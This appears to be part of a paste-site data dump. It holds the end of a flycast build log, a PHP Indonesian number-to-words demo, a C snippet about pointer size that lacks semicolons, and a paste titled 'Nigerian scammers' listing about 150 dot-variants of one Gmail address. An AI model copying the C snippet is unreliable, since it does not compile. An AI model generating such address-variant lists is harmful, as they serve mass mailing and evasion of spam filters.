Submodule path 'core/deps/Spout': checked out 'ce94918ea3561b936405e7f68b6754d975ed2e8f'
Submodule path 'core/deps/Syphon': checked out '486dd8e4ef3bead482ea26de99770f4389e24e37'
Submodule path 'core/deps/Vulkan-Headers': checked out '85c2334e92e215cce34e8e0ed8b2dce4700f4a50'
Submodule path 'core/deps/VulkanMemoryAllocator': checked out '6eb62e1515072827db992c2befd80b71b2d04329'
Submodule path 'core/deps/breakpad': checked out '1ab24bcc817ebe629bf77daa53529d02361cb1e9'
Submodule path 'core/deps/glslang': checked out '76b52ebf77833908dc4c0dd6c70a9c357ac720bd'
Submodule path 'core/deps/libchdr': checked out '925400c4c4b67bafdff8dfad9a1474b22d980777'
Submodule path 'core/deps/luabridge': checked out 'fab7b33b896a42dcc865ba5ecdbacd9f409137f8'
Submodule 'third_party/gtest' (https://github.com/google/googletest.git) registered for path 'core/deps/luabridge/third_party/gtest'
Cloning into '/home/data/scratch/sources/flycast/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/luabridge/third_party/gtest'...
Submodule path 'core/deps/luabridge/third_party/gtest': checked out '58f3f1005cffce8a9d005d0361d3471cd9947501'
Submodule path 'core/deps/oboe': checked out '8740d0fc321a55489dbbf6067298201b7d2e106d'
UNPACK      flycast
    FIXCONFIG      /home/data/CoreELEC/CoreELEC.21/build.CoreELEC-Amlogic-no.aarch64-21/build/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/breakpad/autotools/
    FIXCONFIG      /home/data/CoreELEC/CoreELEC.21/build.CoreELEC-Amlogic-no.aarch64-21/build/flycast-07d6ca6c846ec40ff7f78cbf9f669e70afc956d1/core/deps/SDL/build-scripts/"
bXLndEWB,Demo Fungsi Terbilang di PHP,gurumutant,PHP,Friday 26th of January 2024 01:45:24 AM CDT,"<?php
    /*
        Demo fungsi Terbilang untuk mengetahui pembacaan bilangan besar dalam Bahasa Indonesia
        Original Source : https://www.malasngoding.com/cara-mudah-membuat-fungsi-terbilang-dengan-php/
        Modified to add kuadriliun and a form to test the function, suppress deprecated errors, by RPL SMKN 1 Pacitan
    */

    error_reporting(E_ALL ^ E_DEPRECATED);

	function penyebut($nilai) {
		$nilai = abs($nilai);
		$huruf = array("""", ""satu"", ""dua"", ""tiga"", ""empat"", ""lima"", ""enam"", ""tujuh"", ""delapan"", ""sembilan"", ""sepuluh"", ""sebelas"");
		$temp = """";
		if ($nilai < 12) {
			$temp = "" "". $huruf[$nilai];
		} else if ($nilai <20) {
			$temp = penyebut($nilai - 10). "" belas"";
		} else if ($nilai < 100) {
			$temp = penyebut($nilai/10)."" puluh"". penyebut($nilai % 10);
		} else if ($nilai < 200) {
			$temp = "" seratus"" . penyebut($nilai - 100);
		} else if ($nilai < 1000) {
			$temp = penyebut($nilai/100) . "" ratus"" . penyebut($nilai % 100);
		} else if ($nilai < 2000) {
			$temp = "" seribu"" . penyebut($nilai - 1000);
		} else if ($nilai < 1000000) {
			$temp = penyebut($nilai/1000) . "" ribu"" . penyebut($nilai % 1000);
		} else if ($nilai < 1000000000) {
			$temp = penyebut($nilai/1000000) . "" juta"" . penyebut($nilai % 1000000);
		} else if ($nilai < 1000000000000) {
			$temp = penyebut($nilai/1000000000) . "" milyar"" . penyebut(fmod($nilai,1000000000));
		} else if ($nilai < 1000000000000000) {
			$temp = penyebut($nilai/1000000000000) . "" trilyun"" . penyebut(fmod($nilai,1000000000000)); 
		} else if ($nilai < 1000000000000000000) {
			$temp = penyebut($nilai/1000000000000000) . "" kuadriliun"" . penyebut(fmod($nilai,1000000000000000));
		}     
		return $temp;
	}
 
	function terbilang($nilai) {
		if($nilai<0) {
			$hasil = ""minus "". trim(penyebut($nilai));
		} else {
			$hasil = trim(penyebut($nilai));
		}     		
		return $hasil;
	}

    if (isset($_POST[""bilangan""]) && is_numeric($_POST[""bilangan""])) {
        echo ""<h3>"".number_format($_POST[""bilangan""], 0,',','.').""</h3>"";
        echo terbilang($_POST[""bilangan""]);
    }
?>
<form method=""post"">
<input type=""text"" name=""bilangan"" id=""bilangan"">
<input type=""submit"" value=""Cek"">
</form>    "
j3uX4fuv,Untitled,Tkap1,C,Friday 26th of January 2024 01:28:41 AM CDT,"
int main(void)
{
	char array1[100];
	char array2[20];

	char* ptr = array2;
	sizeof(ptr) // you want 20 here, right?
	ptr -= 100;
	sizeof(ptr) // what now? 100? 20? 120? ptr points to the same place as array1.

	// The problem here is that any time you do pointer math you are going to have to check every array and see if a pointer lands on one
	
	return 0;
}"
n1jjjwgs,Nigerian scammers [26-1-1/2024],bombaires,AIMMS,Friday 26th of January 2024 12:42:37 AM CDT,"<a href=""mailto:nationalfinance827@gmail.com"">nationalfinance827@gmail.com</a>
<a href=""mailto:na.tionalf.ina.nce.82.7@gmail.com"">na.tionalf.ina.nce.82.7@gmail.com</a>
<a href=""mailto:n.a.t.io.n.a.l.finan.c.e.82.7@gmail.com"">n.a.t.io.n.a.l.finan.c.e.82.7@gmail.com</a>
<a href=""mailto:n.a.tio.n.alfi.n.a.n.c.e.8.27@gmail.com"">n.a.tio.n.alfi.n.a.n.c.e.8.27@gmail.com</a>
<a href=""mailto:n.a.t.i.o.n.a.l.f.i.nanc.e82.7@gmail.com"">n.a.t.i.o.n.a.l.f.i.nanc.e82.7@gmail.com</a>
<a href=""mailto:n.at.iona.lfin.an.c.e827@gmail.com"">n.at.iona.lfin.an.c.e827@gmail.com</a>
<a href=""mailto:n.a.t.ion.a.lf.ina.n.ce.827@gmail.com"">n.a.t.ion.a.lf.ina.n.ce.827@gmail.com</a>
<a href=""mailto:natio.n.a.lf.i.na.nce8.2.7@gmail.com"">natio.n.a.lf.i.na.nce8.2.7@gmail.com</a>
<a href=""mailto:n.at.i.o.na.lf.i.na.n.c.e.82.7@gmail.com"">n.at.i.o.na.lf.i.na.n.c.e.82.7@gmail.com</a>
<a href=""mailto:na.t.io.n.al.fi.n.anc.e8.2.7@gmail.com"">na.t.io.n.al.fi.n.anc.e8.2.7@gmail.com</a>
<a href=""mailto:national.f.in.ance82.7@gmail.com"">national.f.in.ance82.7@gmail.com</a>
<a href=""mailto:nati.o.n.al.fi.na.n.c.e827@gmail.com"">nati.o.n.al.fi.na.n.c.e827@gmail.com</a>
<a href=""mailto:n.a.ti.o.na.l.f.i.n.a.nce.8.27@gmail.com"">n.a.ti.o.na.l.f.i.n.a.nce.8.27@gmail.com</a>
<a href=""mailto:n.ati.on.a.lf.i.na.n.ce8.27@gmail.com"">n.ati.on.a.lf.i.na.n.ce8.27@gmail.com</a>
<a href=""mailto:na.tio.n.alf.in.an.ce.827@gmail.com"">na.tio.n.alf.in.an.ce.827@gmail.com</a>
<a href=""mailto:na.t.i.o.nalf.in.an.c.e.8.27@gmail.com"">na.t.i.o.nalf.in.an.c.e.8.27@gmail.com</a>
<a href=""mailto:n.ati.on.alfina.nce82.7@gmail.com"">n.ati.on.alfina.nce82.7@gmail.com</a>
<a href=""mailto:nat.i.on.alf.i.nance.827@gmail.com"">nat.i.on.alf.i.nance.827@gmail.com</a>
<a href=""mailto:natio.n.a.l.f.in.anc.e.827@gmail.com"">natio.n.a.l.f.in.anc.e.827@gmail.com</a>
<a href=""mailto:nat.i.ona.lf.i.na.nce827@gmail.com"">nat.i.ona.lf.i.na.nce827@gmail.com</a>
<a href=""mailto:natio.na.lfi.n.anc.e827@gmail.com"">natio.na.lfi.n.anc.e827@gmail.com</a>
<a href=""mailto:na.t.io.n.a.l.fin.ance.8.27@gmail.com"">na.t.io.n.a.l.fin.ance.8.27@gmail.com</a>
<a href=""mailto:n.a.tional.fi.nan.c.e827@gmail.com"">n.a.tional.fi.nan.c.e827@gmail.com</a>
<a href=""mailto:n.a.t.io.n.alf.inance827@gmail.com"">n.a.t.io.n.alf.inance827@gmail.com</a>
<a href=""mailto:n.ati.ona.lf.in.a.n.ce82.7@gmail.com"">n.ati.ona.lf.in.a.n.ce82.7@gmail.com</a>
<a href=""mailto:n.ati.on.a.l.f.inan.ce8.27@gmail.com"">n.ati.on.a.l.f.inan.ce8.27@gmail.com</a>
<a href=""mailto:nat.i.ona.lf.inan.ce8.2.7@gmail.com"">nat.i.ona.lf.inan.ce8.2.7@gmail.com</a>
<a href=""mailto:nat.i.on.alfi.n.ance.8.2.7@gmail.com"">nat.i.on.alfi.n.ance.8.2.7@gmail.com</a>
<a href=""mailto:n.a.tio.n.alfi.na.nce8.2.7@gmail.com"">n.a.tio.n.alfi.na.nce8.2.7@gmail.com</a>
<a href=""mailto:n.at.ion.al.f.i.na.nc.e.8.2.7@gmail.com"">n.at.ion.al.f.i.na.nc.e.8.2.7@gmail.com</a>
<a href=""mailto:n.ati.o.n.alf.in.an.c.e.8.2.7@gmail.com"">n.ati.o.n.alf.in.an.c.e.8.2.7@gmail.com</a>
<a href=""mailto:na.t.i.on.alfinanc.e82.7@gmail.com"">na.t.i.on.alfinanc.e82.7@gmail.com</a>
<a href=""mailto:nat.i.o.n.a.l.f.in.a.n.ce8.27@gmail.com"">nat.i.o.n.a.l.f.in.a.n.ce8.27@gmail.com</a>
<a href=""mailto:n.at.i.o.n.a.l.f.i.n.an.c.e827@gmail.com"">n.at.i.o.n.a.l.f.i.n.an.c.e827@gmail.com</a>
<a href=""mailto:na.t.i.o.na.l.fin.an.c.e.8.27@gmail.com"">na.t.i.o.na.l.fin.an.c.e.8.27@gmail.com</a>
<a href=""mailto:nat.io.n.alf.in.a.nc.e8.27@gmail.com"">nat.io.n.alf.in.a.nc.e8.27@gmail.com</a>
<a href=""mailto:na.ti.o.nal.f.i.na.n.c.e.8.2.7@gmail.com"">na.ti.o.nal.f.i.na.n.c.e.8.2.7@gmail.com</a>
<a href=""mailto:n.a.tion.a.lfina.nce.8.27@gmail.com"">n.a.tion.a.lfina.nce.8.27@gmail.com</a>
<a href=""mailto:n.at.i.on.al.fi.n.a.n.ce.82.7@gmail.com"">n.at.i.on.al.fi.n.a.n.ce.82.7@gmail.com</a>
<a href=""mailto:na.t.ion.a.lfi.nan.ce827@gmail.com"">na.t.ion.a.lfi.nan.ce827@gmail.com</a>
<a href=""mailto:natio.n.a.lf.ina.n.c.e827@gmail.com"">natio.n.a.lf.ina.n.c.e827@gmail.com</a>
<a href=""mailto:na.t.io.n.a.lfinanc.e8.2.7@gmail.com"">na.t.io.n.a.lfinanc.e8.2.7@gmail.com</a>
<a href=""mailto:n.atio.na.l.f.i.nanc.e8.2.7@gmail.com"">n.atio.na.l.f.i.nanc.e8.2.7@gmail.com</a>
<a href=""mailto:nati.o.n.a.lf.ina.n.ce.82.7@gmail.com"">nati.o.n.a.lf.ina.n.ce.82.7@gmail.com</a>
<a href=""mailto:na.tio.n.alf.i.n.a.n.c.e.8.27@gmail.com"">na.tio.n.alf.i.n.a.n.c.e.8.27@gmail.com</a>
<a href=""mailto:n.at.ional.f.i.n.an.ce827@gmail.com"">n.at.ional.f.i.n.an.ce827@gmail.com</a>
<a href=""mailto:n.ationa.lfi.n.an.c.e.8.2.7@gmail.com"">n.ationa.lfi.n.an.c.e.8.2.7@gmail.com</a>
<a href=""mailto:n.a.t.i.o.n.a.lf.inan.ce8.2.7@gmail.com"">n.a.t.i.o.n.a.lf.inan.ce8.2.7@gmail.com</a>
<a href=""mailto:nat.iona.lfin.an.ce.8.27@gmail.com"">nat.iona.lfin.an.ce.8.27@gmail.com</a>
<a href=""mailto:n.a.ti.o.n.al.f.inan.c.e.8.27@gmail.com"">n.a.ti.o.n.al.f.inan.c.e.8.27@gmail.com</a>
<a href=""mailto:na.t.ion.al.f.ina.n.ce827@gmail.com"">na.t.ion.al.f.ina.n.ce827@gmail.com</a>
<a href=""mailto:na.t.i.on.alfina.nce.8.27@gmail.com"">na.t.i.on.alfina.nce.8.27@gmail.com</a>
<a href=""mailto:na.tio.n.al.fin.a.nc.e827@gmail.com"">na.tio.n.al.fin.a.nc.e827@gmail.com</a>
<a href=""mailto:n.a.t.i.on.al.f.in.an.c.e8.27@gmail.com"">n.a.t.i.on.al.f.in.an.c.e8.27@gmail.com</a>
<a href=""mailto:n.a.t.i.o.na.l.f.i.n.a.n.ce8.2.7@gmail.com"">n.a.t.i.o.na.l.f.i.n.a.n.ce8.2.7@gmail.com</a>
<a href=""mailto:n.a.t.io.na.lfin.a.nc.e.82.7@gmail.com"">n.a.t.io.na.lfin.a.nc.e.82.7@gmail.com</a>
<a href=""mailto:n.a.ti.on.al.f.i.nance.827@gmail.com"">n.a.ti.on.al.f.i.nance.827@gmail.com</a>
<a href=""mailto:nation.a.l.fina.n.c.e.827@gmail.com"">nation.a.l.fina.n.c.e.827@gmail.com</a>
<a href=""mailto:n.at.i.o.nalfinan.ce.8.2.7@gmail.com"">n.at.i.o.nalfinan.ce.8.2.7@gmail.com</a>
<a href=""mailto:n.a.ti.on.a.l.f.ina.nc.e8.2.7@gmail.com"">n.a.ti.on.a.l.f.ina.nc.e8.2.7@gmail.com</a>
<a href=""mailto:n.ati.o.nalfin.anc.e8.27@gmail.com"">n.ati.o.nalfin.anc.e8.27@gmail.com</a>
<a href=""mailto:na.t.i.o.n.al.fi.na.nce82.7@gmail.com"">na.t.i.o.n.al.fi.na.nce82.7@gmail.com</a>
<a href=""mailto:na.ti.ona.lf.ina.nce8.27@gmail.com"">na.ti.ona.lf.ina.nce8.27@gmail.com</a>
<a href=""mailto:nati.on.al.fi.na.n.ce.827@gmail.com"">nati.on.al.fi.na.n.ce.827@gmail.com</a>
<a href=""mailto:n.a.ti.o.nal.f.i.n.an.ce.8.2.7@gmail.com"">n.a.ti.o.nal.f.i.n.an.ce.8.2.7@gmail.com</a>
<a href=""mailto:na.tio.na.lfinan.c.e.8.27@gmail.com"">na.tio.na.lfinan.c.e.8.27@gmail.com</a>
<a href=""mailto:n.a.t.io.nalfi.nanc.e.82.7@gmail.com"">n.a.t.io.nalfi.nanc.e.82.7@gmail.com</a>
<a href=""mailto:nat.io.n.al.f.ina.nce.8.27@gmail.com"">nat.io.n.al.f.ina.nce.8.27@gmail.com</a>
<a href=""mailto:n.ati.on.a.l.fi.n.a.nce.8.27@gmail.com"">n.ati.on.a.l.fi.n.a.nce.8.27@gmail.com</a>
<a href=""mailto:n.a.t.i.o.n.a.l.f.i.nan.c.e82.7@gmail.com"">n.a.t.i.o.n.a.l.f.i.nan.c.e82.7@gmail.com</a>
<a href=""mailto:nat.i.onalfin.ance8.2.7@gmail.com"">nat.i.onalfin.ance8.2.7@gmail.com</a>
<a href=""mailto:nat.i.o.n.a.lfi.n.a.n.ce.8.27@gmail.com"">nat.i.o.n.a.lfi.n.a.n.ce.8.27@gmail.com</a>
<a href=""mailto:n.ationa.l.f.in.anc.e8.27@gmail.com"">n.ationa.l.f.in.anc.e8.27@gmail.com</a>
<a href=""mailto:nati.o.n.alfi.n.a.n.ce827@gmail.com"">nati.o.n.alfi.n.a.n.ce827@gmail.com</a>
<a href=""mailto:n.a.t.io.na.lfin.ance8.2.7@gmail.com"">n.a.t.io.na.lfin.ance8.2.7@gmail.com</a>
<a href=""mailto:na.t.i.o.nal.f.i.n.an.ce8.2.7@gmail.com"">na.t.i.o.nal.f.i.n.an.ce8.2.7@gmail.com</a>
<a href=""mailto:nat.ion.a.l.f.in.an.c.e8.2.7@gmail.com"">nat.ion.a.l.f.in.an.c.e8.2.7@gmail.com</a>
<a href=""mailto:n.ati.on.alfinance.8.27@gmail.com"">n.ati.on.alfinance.8.27@gmail.com</a>
<a href=""mailto:na.ti.o.nal.finance82.7@gmail.com"">na.ti.o.nal.finance82.7@gmail.com</a>
<a href=""mailto:nati.o.n.a.lfi.n.a.n.c.e8.2.7@gmail.com"">nati.o.n.a.lfi.n.a.n.c.e8.2.7@gmail.com</a>
<a href=""mailto:nat.ion.a.l.f.i.nanc.e.82.7@gmail.com"">nat.ion.a.l.f.i.nanc.e.82.7@gmail.com</a>
<a href=""mailto:n.atio.n.a.l.f.i.n.a.nc.e.8.2.7@gmail.com"">n.atio.n.a.l.f.i.n.a.nc.e.8.2.7@gmail.com</a>
<a href=""mailto:nat.io.n.a.l.fi.n.a.nce8.2.7@gmail.com"">nat.io.n.a.l.fi.n.a.nce8.2.7@gmail.com</a>
<a href=""mailto:n.a.tio.n.alf.i.na.nc.e827@gmail.com"">n.a.tio.n.alf.i.na.nc.e827@gmail.com</a>
<a href=""mailto:n.a.tio.n.a.l.f.i.n.a.nc.e82.7@gmail.com"">n.a.tio.n.a.l.f.i.n.a.nc.e82.7@gmail.com</a>
<a href=""mailto:n.a.t.i.on.alfi.n.an.ce.82.7@gmail.com"">n.a.t.i.on.alfi.n.an.ce.82.7@gmail.com</a>
<a href=""mailto:natio.n.a.l.f.in.ance.82.7@gmail.com"">natio.n.a.l.f.in.ance.82.7@gmail.com</a>
<a href=""mailto:n.a.t.ion.a.lf.i.n.a.nc.e8.27@gmail.com"">n.a.t.ion.a.lf.i.n.a.nc.e8.27@gmail.com</a>
<a href=""mailto:natio.nalf.in.ance8.2.7@gmail.com"">natio.nalf.in.ance8.2.7@gmail.com</a>
<a href=""mailto:n.at.io.na.lf.i.n.anc.e.827@gmail.com"">n.at.io.na.lf.i.n.anc.e.827@gmail.com</a>
<a href=""mailto:n.at.io.nal.f.i.na.nce.827@gmail.com"">n.at.io.nal.f.i.na.nce.827@gmail.com</a>
<a href=""mailto:nat.io.n.al.fin.a.nce.827@gmail.com"">nat.io.n.al.fin.a.nce.827@gmail.com</a>
<a href=""mailto:na.t.io.na.lf.i.n.a.n.ce827@gmail.com"">na.t.io.na.lf.i.n.a.n.ce827@gmail.com</a>
<a href=""mailto:n.atio.n.alfina.nc.e82.7@gmail.com"">n.atio.n.alfina.nc.e82.7@gmail.com</a>
<a href=""mailto:n.at.i.o.na.lfinan.ce827@gmail.com"">n.at.i.o.na.lfinan.ce827@gmail.com</a>
<a href=""mailto:n.a.tio.na.lfi.nan.c.e8.2.7@gmail.com"">n.a.tio.na.lfi.nan.c.e8.2.7@gmail.com</a>
<a href=""mailto:na.t.i.o.n.a.lf.i.na.n.ce82.7@gmail.com"">na.t.i.o.n.a.lf.i.na.n.ce82.7@gmail.com</a>
<a href=""mailto:na.ti.o.na.l.f.i.nan.c.e.8.27@gmail.com"">na.ti.o.na.l.f.i.nan.c.e.8.27@gmail.com</a>
<a href=""mailto:nati.on.alf.i.nan.ce827@gmail.com"">nati.on.alf.i.nan.ce827@gmail.com</a>
<a href=""mailto:na.tion.al.f.inan.c.e827@gmail.com"">na.tion.al.f.inan.c.e827@gmail.com</a>
<a href=""mailto:n.a.ti.onalfin.an.ce.82.7@gmail.com"">n.a.ti.onalfin.an.ce.82.7@gmail.com</a>
<a href=""mailto:na.t.ion.a.lfin.an.c.e.82.7@gmail.com"">na.t.ion.a.lfin.an.c.e.82.7@gmail.com</a>
<a href=""mailto:n.a.ti.on.a.lf.inan.c.e.82.7@gmail.com"">n.a.ti.on.a.lf.inan.c.e.82.7@gmail.com</a>
<a href=""mailto:n.at.i.o.n.a.lf.i.nan.ce827@gmail.com"">n.at.i.o.n.a.lf.i.nan.ce827@gmail.com</a>
<a href=""mailto:n.ation.alfi.n.anc.e.8.2.7@gmail.com"">n.ation.alfi.n.anc.e.8.2.7@gmail.com</a>
<a href=""mailto:na.ti.onalf.in.a.nce.82.7@gmail.com"">na.ti.onalf.in.a.nce.82.7@gmail.com</a>
<a href=""mailto:nat.io.n.alfi.na.nce8.27@gmail.com"">nat.io.n.alfi.na.nce8.27@gmail.com</a>
<a href=""mailto:n.a.ti.on.a.l.f.i.na.n.ce827@gmail.com"">n.a.ti.on.a.l.f.i.na.n.ce827@gmail.com</a>
<a href=""mailto:n.ational.f.in.an.ce.82.7@gmail.com"">n.ational.f.in.an.ce.82.7@gmail.com</a>
<a href=""mailto:natio.nalfi.na.n.c.e82.7@gmail.com"">natio.nalfi.na.n.c.e82.7@gmail.com</a>
<a href=""mailto:n.at.iona.lf.in.anc.e.8.27@gmail.com"">n.at.iona.lf.in.anc.e.8.27@gmail.com</a>
<a href=""mailto:na.ti.o.n.a.lf.i.nance.8.27@gmail.com"">na.ti.o.n.a.lf.i.nance.8.27@gmail.com</a>
<a href=""mailto:n.ational.fi.na.nce8.2.7@gmail.com"">n.ational.fi.na.nce8.2.7@gmail.com</a>
<a href=""mailto:n.a.t.i.onal.f.ina.nc.e.8.27@gmail.com"">n.a.t.i.onal.f.ina.nc.e.8.27@gmail.com</a>
<a href=""mailto:n.atio.na.l.fi.nanc.e.8.27@gmail.com"">n.atio.na.l.fi.nanc.e.8.27@gmail.com</a>
<a href=""mailto:n.at.i.o.na.l.fin.an.c.e.8.2.7@gmail.com"">n.at.i.o.na.l.fin.an.c.e.8.2.7@gmail.com</a>
<a href=""mailto:n.a.t.i.on.a.lf.ina.n.c.e.8.2.7@gmail.com"">n.a.t.i.on.a.lf.ina.n.c.e.8.2.7@gmail.com</a>
<a href=""mailto:na.t.i.o.n.alfi.n.a.nce.8.2.7@gmail.com"">na.t.i.o.n.alfi.n.a.nce.8.2.7@gmail.com</a>
<a href=""mailto:n.at.i.o.n.a.lf.in.a.n.ce8.27@gmail.com"">n.at.i.o.n.a.lf.in.a.n.ce8.27@gmail.com</a>
<a href=""mailto:n.a.tionalf.i.n.anc.e827@gmail.com"">n.a.tionalf.i.n.anc.e827@gmail.com</a>
<a href=""mailto:na.tio.na.lf.i.nan.c.e.8.27@gmail.com"">na.tio.na.lf.i.nan.c.e.8.27@gmail.com</a>
<a href=""mailto:n.a.tio.na.lfi.n.an.c.e.8.27@gmail.com"">n.a.tio.na.lfi.n.an.c.e.8.27@gmail.com</a>
<a href=""mailto:n.a.tio.nal.f.i.nan.ce.8.2.7@gmail.com"">n.a.tio.nal.f.i.nan.ce.8.2.7@gmail.com</a>
<a href=""mailto:n.a.t.ion.alf.in.an.ce.8.27@gmail.com"">n.a.t.ion.alf.in.an.ce.8.27@gmail.com</a>
<a href=""mailto:nat.iona.l.f.i.n.an.c.e.8.2.7@gmail.com"">nat.iona.l.f.i.n.an.c.e.8.2.7@gmail.com</a>
<a href=""mailto:n.ation.al.fin.an.ce8.2.7@gmail.com"">n.ation.al.fin.an.ce8.2.7@gmail.com</a>
<a href=""mailto:n.a.tio.n.alf.i.n.anc.e82.7@gmail.com"">n.a.tio.n.alf.i.n.anc.e82.7@gmail.com</a>
<a href=""mailto:n.a.t.io.na.lf.in.ance.82.7@gmail.com"">n.a.t.io.na.lf.in.ance.82.7@gmail.com</a>
<a href=""mailto:na.tio.n.a.lf.in.anc.e8.27@gmail.com"">na.tio.n.a.lf.in.anc.e8.27@gmail.com</a>
<a href=""mailto:nat.io.n.a.l.f.i.na.nc.e.82.7@gmail.com"">nat.io.n.a.l.f.i.na.nc.e.82.7@gmail.com</a>
<a href=""mailto:na.tion.a.l.fi.n.a.nce82.7@gmail.com"">na.tion.a.l.fi.n.a.nce82.7@gmail.com</a>
<a href=""mailto:nat.i.o.n.a.l.f.inance827@gmail.com"">nat.i.o.n.a.l.f.inance827@gmail.com</a>
<a href=""mailto:na.tio.na.l.fi.n.ance827@gmail.com"">na.tio.na.l.fi.n.ance827@gmail.com</a>
<a href=""mailto:n.atio.n.al.fi.n.ance.82.7@gmail.com"">n.atio.n.al.fi.n.ance.82.7@gmail.com</a>
<a href=""mailto:n.a.ti.o.nal.fi.nan.ce827@gmail.com"">n.a.ti.o.nal.fi.nan.ce827@gmail.com</a>
<a href=""mailto:n.ati.o.n.a.l.fi.nan.c.e.8.2.7@gmail.com"">n.ati.o.n.a.l.fi.nan.c.e.8.2.7@gmail.com</a>
<a href=""mailto:nat.i.on.a.lfinan.ce82.7@gmail.com"">nat.i.on.a.lfinan.ce82.7@gmail.com</a>
<a href=""mailto:n.a.t.i.onalfina.nce.8.27@gmail.com"">n.a.t.i.onalfina.nce.8.27@gmail.com</a>
<a href=""mailto:nat.i.o.n.alf.ina.n.ce8.27@gmail.com"">nat.i.o.n.alf.ina.n.ce8.27@gmail.com</a>
<a href=""mailto:na.tio.n.a.lfi.na.nce.82.7@gmail.com"">na.tio.n.a.lfi.na.nce.82.7@gmail.com</a>
<a href=""mailto:na.t.ion.al.fi.na.nc.e82.7@gmail.com"">na.t.ion.al.fi.na.nc.e82.7@gmail.com</a>
<a href=""mailto:na.t.iona.l.fina.n.ce.827@gmail.com"">na.t.iona.l.fina.n.ce.827@gmail.com</a>
<a href=""mailto:na.tion.alfi.n.anc.e.8.2.7@gmail.com"">na.tion.alfi.n.anc.e.8.2.7@gmail.com</a>
<a href=""mailto:n.a.t.i.onalf.in.a.nce827@gmail.com"">n.a.t.i.onalf.in.a.nce827@gmail.com</a>
<a href=""mailto:natio.n.a.l.fi.na.n.ce.8.2.7@gmail.com"">natio.n.a.l.fi.na.n.ce.8.2.7@gmail.com</a>
<a href=""mailto:nati.ona.lfi.nan.ce827@gmail.com"">nati.ona.lfi.nan.ce827@gmail.com</a>
<a href=""mailto:n.ation.a.l.f.i.na.nce827@gmail.com"">n.ation.a.l.f.i.na.nce827@gmail.com</a>
<a href=""mailto:natio.nalf.ina.nc.e827@gmail.com"">natio.nalf.ina.nc.e827@gmail.com</a>
<a href=""mailto:nati.on.alfi.na.n.ce.8.27@gmail.com"">nati.on.alfi.na.n.ce.8.27@gmail.com</a>
<a href=""mailto:n.ati.on.a.lf.inan.ce827@gmail.com"">n.ati.on.a.lf.inan.ce827@gmail.com</a>
<a href=""mailto:n.a.tio.n.alfinan.ce.8.27@gmail.com"">n.a.tio.n.alfinan.ce.8.27@gmail.com</a>
<a href=""mailto:na.t.io.nalf.ina.nc.e.82.7@gmail.com"">na.t.io.nalf.ina.nc.e.82.7@gmail.com</a>
<a href=""mailto:nat.ionalf.i.n.a.n.ce8.27@gmail.com"">nat.ionalf.i.n.a.n.ce8.27@gmail.com</a>
<a href=""mailto:na.tiona.lf.i.n.anc.e.8.27@gmail.com"">na.tiona.lf.i.n.anc.e.8.27@gmail.com</a>
<a href=""mailto:nat.i.o.na.l.f.in.anc.e82.7@gmail.com"">nat.i.o.na.l.f.in.anc.e82.7@gmail.com</a>
<a href=""mailto:n.a.t.i.on.al.f.in.ance.8.2.7@gmail.com"">n.a.t.i.on.al.f.in.ance.8.2.7@gmail.com</a>
<a href=""mailto:n.at.ion.a.lf.i.nan.ce8.2.7@gmail.com"">n.at.ion.a.lf.i.nan.ce8.2.7@gmail.com</a>
<a href=""mailto:n.ati.o.n.al.f.in.a.nc.e8.27@gmail.com"">n.ati.o.n.al.f.in.a.nc.e8.27@gmail.com</a>
<a href=""mailto:n.ati.o.nalf.i.nance8.27@gmail.com"">n.ati.o.nalf.i.nance8.27@gmail.com</a>
<a href=""mailto:n.a.t.io.n.alfi.n.an.ce.82.7@gmail.com"">n.a.t.io.n.alfi.n.an.ce.82.7@gmail.com</a>
<a href=""mailto:nat.i.o.nalf.in.a.nce.82.7@gmail.com"">nat.i.o.nalf.in.a.nce.82.7@gmail.com</a>
<a href=""mailto:nati.on.alf.in.a.n.ce.827@gmail.com"">nati.on.alf.in.a.n.ce.827@gmail.com</a>
<a href=""mailto:n.a.t.i.onalf.in.anc.e.82.7@gmail.com"">n.a.t.i.onalf.in.anc.e.82.7@gmail.com</a>
<a href=""mailto:n.ati.o.n.a.lfin.a.nc.e8.27@gmail.com"">n.ati.o.n.a.lfin.a.nc.e8.27@gmail.com</a>
<a href=""mailto:na.tional.fi.nanc.e.82.7@gmail.com"">na.tional.fi.nanc.e.82.7@gmail.com</a>
<a href=""mailto:n.a.t.i.on.alfin.an.c.e.8.27@gmail.com"">n.a.t.i.on.alfin.an.c.e.8.27@gmail.com</a>
<a href=""mailto:n.ati.o.na.l.fina.nc.e.8.27@gmail.com"">n.ati.o.na.l.fina.nc.e.8.27@gmail.com</a>
<a href=""mailto:na.t.i.on.al.financ.e827@gmail.com"">na.t.i.on.al.financ.e827@gmail.com</a>
<a href=""mailto:na.t.i.on.al.f.ina.n.c.e.8.27@gmail.com"">na.t.i.on.al.f.ina.n.c.e.8.27@gmail.com</a>
<a href=""mailto:n.at.io.nal.fin.a.n.ce.82.7@gmail.com"">n.at.io.nal.fin.a.n.ce.82.7@gmail.com</a>
<a href=""mailto:nat.i.on.a.lfi.na.nce827@gmail.com"">nat.i.on.a.lfi.na.nce827@gmail.com</a>
<a href=""mailto:na.tio.n.alf.in.a.n.ce.8.2.7@gmail.com"">na.tio.n.alf.in.a.n.ce.8.2.7@gmail.com</a>
<a href=""mailto:n.at.ion.alfina.n.c.e.827@gmail.com"">n.at.ion.alfina.n.c.e.827@gmail.com</a>
<a href=""mailto:n.a.t.io.na.l.f.inanc.e.8.2.7@gmail.com"">n.a.t.io.na.l.f.inanc.e.8.2.7@gmail.com</a>
<a href=""mailto:na.tio.na.lf.inan.c.e.8.2.7@gmail.com"">na.tio.na.lf.inan.c.e.8.2.7@gmail.com</a>
<a href=""mailto:n.a.tion.a.l.f.ina.n.c.e.8.2.7@gmail.com"">n.a.tion.a.l.f.ina.n.c.e.8.2.7@gmail.com</a>
<a href=""mailto:n.at.io.na.l.f.i.n.a.n.c.e.8.27@gmail.com"">n.at.io.na.l.f.i.n.a.n.c.e.8.27@gmail.com</a>
<a href=""mailto:n.a.tion.a.lfi.na.n.ce.8.27@gmail.com"">n.a.tion.a.lfi.na.n.ce.8.27@gmail.com</a>
<a href=""mailto:na.t.i.o.nalf.in.an.ce.8.2.7@gmail.com"">na.t.i.o.nalf.in.an.ce.8.2.7@gmail.com</a>
<a href=""mailto:na.t.i.o.n.alf.i.nan.ce827@gmail.com"">na.t.i.o.n.alf.i.nan.ce827@gmail.com</a>
<a href=""mailto:nati.o.nal.financ.e.8.2.7@gmail.com"">nati.o.nal.financ.e.8.2.7@gmail.com</a>
